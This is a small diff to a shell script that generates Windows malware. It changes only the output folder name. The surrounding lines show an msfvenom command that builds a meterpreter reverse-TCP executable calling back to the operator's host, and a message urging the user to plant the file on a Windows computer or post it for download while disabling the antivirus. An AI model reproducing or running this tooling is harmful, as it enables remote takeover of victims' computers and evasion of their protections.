@@ -9,7 +9,7 @@ lhost=$(hostname -I | awk '{print $1}')
     read extension
     echo "Creating .exe file..."
     msfvenom -p windows/x64/meterpreter/reverse_tcp lost=$lhost lport=$lport -f exe > $extension.exe
-    mv $extension.exe Executables
+    mv $extension.exe exeFiles
     echo "Once it's done, I advise you to take the .exe file with an USB key or by FTP/SFTP, so you can put it on a Windows Computer, or put it on the Internet to  make it downloadable,
 but, the .exe file is very detectable, so don't forget to disable the antivurus present on the computer."
     echo ""
